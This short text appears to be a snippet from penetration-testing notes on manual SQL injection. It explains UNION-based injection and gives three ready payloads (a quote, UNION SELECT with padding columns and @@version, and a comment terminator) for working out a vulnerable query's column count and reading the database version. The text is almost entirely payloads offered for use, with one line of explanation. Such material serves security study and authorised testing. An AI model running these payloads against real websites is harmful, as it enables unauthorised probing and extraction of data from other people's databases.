# For manual injections, UNION injections are something you want to understand.

        # Increasing one column each request, until our @@version payload is successful. Columns 1,2,3 etc are just padding.
	' UNION select 1,2,@@version -- -
	' UNION select 1,2,3,@@version -- -
	' UNION select 1,2,3,4,@@version -- -
